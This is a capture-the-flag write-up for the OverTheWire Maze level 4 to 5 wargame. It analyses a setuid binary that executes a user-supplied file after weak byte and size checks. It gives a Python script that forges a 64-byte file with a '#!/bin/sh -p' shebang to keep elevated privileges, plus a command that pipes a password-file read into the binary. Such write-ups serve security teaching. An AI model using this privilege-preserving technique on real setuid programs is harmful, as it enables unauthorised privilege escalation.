# OverTheWire — Maze Level 4 → 5

> Goal: Get `maze5` password from `maze4`. Result: **`**********`** (hidden)
> Technique: Bypass a "file validator's" weak checks and use `execv(argv[1])` to **run our own
> script as maze5** + prevent privilege drop in the setuid script with `#!/bin/sh -p`.

---

## 1. First Look
```bash
/maze/maze4               # usage: /maze/maze4 file2check
/maze/maze4 AAAA          # open: No such file or directory
```
argv[1] is a file path; the program opens and "validates" it, then executes it if it passes.

## 2. Analysis (pseudocode)
```c
char buf1[0x34]; char buf2[0x20]; struct stat st;
fd = open(argv[1], O_RDONLY);
stat(argv[1], &st);
read(fd, buf1, 0x34);                 // first 52 bytes
lseek(fd, *(int*)&buf1[28], SEEK_SET); // offset = file[28..31]
read(fd, buf2, 0x20);                 // 32 bytes from that offset
if ( *(uint*)&buf2[12] == (ubyte)buf1[7] * (ubyte)buf1[8]   // PRODUCT check
     && st.st_size <= 0x7b ) {                              // size <= 123
    puts("valid file, executing");
    execv(argv[1], NULL);             // <-- EXECUTE the file (as maze5)
}
```

## 3. Conditions to Pass
1. `file[7] * file[8] == dword(buf2+12)`; where `buf2` is the 32 bytes read from
   **the offset stored at `file[28..31]`**.
2. File size **≤ 123**.
3. File must be **execv-able** → executable (`+x`) bit + valid format (shebang script).

## 4. Key Tricks
- **Shebang `#!/bin/sh -p`**: `execv` preserves euid=maze5 but `/bin/sh` (dash) drops
  privileges when it sees `euid != ruid`. The `-p` flag **prevents this** → shell stays maze5.
- **Control bytes must not corrupt the shell**: the shell reads line by line. We put a short
  second line (`exec sh -p`) that immediately `exec`s → the shell **never parses** the rest of
  the file (offset 24+). This lets us bury the `lseek` offset (bytes 28-31, which contain NUL)
  and the magic bytes at the end, in the "dead zone" the shell never parses.
- **`exec sh -p`** with no argument → shell reads commands from **stdin**. We pipe
  `cat /etc/maze_pass/maze5` to maze4 via stdin.
- `file[7]='s'`, `file[8]='h'` (from shebang) → product `115*104 = 0x2EB8`.

## 5. Exploit — crafted `check` file
```python
d  = b"#!/bin/sh -p\n"          # 0-12   (byte7='s', byte8='h')
d += b"exec sh -p\n"            # 13-23  (shell execs here, never reads the rest)
d  = d.ljust(28,b'#')
d += (32).to_bytes(4,'little')  # 28-31  -> lseek offset = 32
d  = d.ljust(44,b'#')
d += (0x2EB8).to_bytes(4,'little')  # 44-47 -> read#2(offset 32)+12 == 's'*'h'
d  = d.ljust(64,b'#')           # total 64 bytes (<=123)
open("check","wb").write(d); os.chmod("check",0o755)
```
```bash
printf 'cat /etc/maze_pass/maze5\n' | /maze/maze4 "$PWD/check"
# valid file, executing
# euid=15005(maze5) ... <maze5 password>
```

## Lessons
| Topic | Note |
|-------|------|
| Weak "validation" | A few bytes + size check provides no real security; an attacker can trivially forge the file |
| setuid + `execv(user_input)` | Executing a file supplied by the user = direct code execution |
| Setuid script & `-p` | Without `#!/bin/sh -p`, dash/bash drops privileges to `ruid`; `-p` preserves them |
| Shebang + stdin | `exec sh -p` (no argument) reads commands from stdin → feed the path without embedding it in the script |
| Parse boundary | Force early `exec` so the shell never reaches the remaining bytes (NUL-containing control data) in the "dead zone" |
